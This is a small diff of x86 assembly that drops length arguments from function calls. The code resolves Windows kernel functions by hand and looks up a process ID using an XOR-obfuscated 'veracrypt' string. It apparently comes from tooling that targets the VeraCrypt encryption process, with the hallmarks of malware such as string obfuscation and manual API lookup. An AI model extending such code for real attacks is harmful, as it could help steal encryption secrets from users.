@@ -107,12 +107,10 @@ main:
     push dword [ebp - 4]                            ; kernel handle
     call get_proc_address_by_get_proc_addr
 
-    push InterlockedPushListSList_str.len
     push InterlockedPushListSList_str
     push dword [ebp - 4]                            ; kernel handle
     call get_proc_address_by_name
 
-    push veracrypt_xor.len
     push veracrypt_xor
     call find_target_process_id
 
